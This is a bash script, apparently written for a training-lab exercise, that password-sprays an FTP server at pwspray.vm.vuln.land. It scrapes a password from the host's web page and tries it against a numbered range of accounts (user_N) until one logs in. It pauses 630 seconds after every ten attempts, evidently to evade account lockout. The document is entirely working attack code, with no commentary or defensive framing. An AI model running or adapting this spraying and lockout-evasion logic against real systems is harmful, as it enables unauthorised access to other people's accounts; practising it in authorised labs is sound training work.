#!/bin/bash

MYSTART=$1
MYEND=$2
MYCOUNTER=0
MYPASS=$(curl -k --resolve pwspray.vm.vuln.land:21:152.96.14.197 https://pwspray.vm.vuln.land | grep ftp -A 3 | tail -1 | cut -d'>' -f 2 | cut -d'<' -f 1)
echo "Password is set to: ${MYPASS}"


for i in $( seq ${MYSTART} ${MYEND}); do

  ((MYCOUNTER++))
  if [[ $MYCOUNTER -eq 10 ]]; then
    date
    echo "sleeping for 10 minutes and 30 seconds"
    sleep 630
    MYCOUNTER=0
  fi

  curl --resolve pwspray.vm.vuln.land:21:152.96.14.197 --ftp-pasv ftp://user_${i}:${MYPASS}@pwspray.vm.vuln.land
  if [ $? -eq 0 ]; then echo "------ Found it: user_${i}  --  $MYPASS   ---------"; exit 0; else echo "user_${i} did not work";fi


done
